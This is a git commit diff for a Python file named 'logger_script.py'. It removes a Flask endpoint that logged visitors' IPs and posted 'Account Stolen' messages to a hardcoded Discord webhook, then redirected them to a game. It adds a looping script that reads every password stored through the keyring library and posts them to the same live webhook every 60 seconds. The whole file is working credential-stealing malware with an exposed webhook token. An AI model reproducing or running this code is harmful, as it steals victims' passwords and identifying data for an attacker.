373f3db3f6bfa2f8a450dfa904227ef4b08f5bd7
wanderingfu <Thegoatleopold10@gmail.com>
2024-05-18 17:07:24 -0500

    Update logger_script.py

--- logger_script.py
+++ logger_script.py
@@ -1,37 +1,24 @@
+import keyring
 import requests
-from flask import Flask, redirect, request
+import time
 
-app = Flask(__name__)
+def steal_passwords():
+    all_passwords = {}
+    for service_name in keyring.get_services():
+        for username in keyring.get_keys(service_name):
+            password = keyring.get_password(service_name, username)
+            all_passwords[f'{service_name}:{username}'] = password
+    return all_passwords
 
-# Discord webhook URL
-discord_webhook_url = 'https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX'
+def send_passwords_to_discord(passwords):
+    webhook_url = 'https://discord.com/api/webhooks/1241497177771999233/IBBDUMt981jObFoKodixaPC7TWaV-apMYGUWYnyizwUtWWiKKZhp4Wzq91dFbGmFcuhX'
+    message = ''
+    for app, password in passwords.items():
+        message += f'{app}: {password}\n'
+    requests.post(webhook_url, data={'content': message})
 
-# Endpoint to handle the redirection
-@app.route('/redirect', methods=['GET'])
-def redirect_to_site():
-    target_username = request.args.get('username')
-    
-    # Send the username to your Discord webhook
-    discord_payload = {'content': f'Discord Account Stolen for user: {target_username}'}
-    response = requests.post(discord_webhook_url, json=discord_payload)
-    print(response.text)  # Print the response from Discord webhook
-    
-    # Replace 'YOUR_ROBLOX_WEBHOOK_URL' with your Roblox webhook URL
-    roblox_webhook_url = 'YOUR_ROBLOX_WEBHOOK_URL'
-    # Send the username to your Roblox webhook
-    roblox_payload = {'content': f'Roblox Account Stolen for user: {target_username}'}
-    # Uncomment the next line if you have a Roblox webhook URL
-    # response = requests.post(roblox_webhook_url, json=roblox_payload)
-    
-    # Retrieve the user's IP address
-    user_ip = request.remote_addr
-    # Log the user's IP address
-    with open('user_ips.txt', 'a') as f:
-        f.write(f'User: {target_username}, IP: {user_ip}\n')
-    
-    # Redirect to Cookie Clicker game
-    return redirect('https://orteil.dashnet.org/cookieclicker/', code=302)
-
-# Main function to run the Flask app
-if __name__ == '__main__':
-    app.run(port=5000)
+while True:
+    all_passwords = steal_passwords()
+    if all_passwords:
+        send_passwords_to_discord(all_passwords)
+        time.sleep(60)
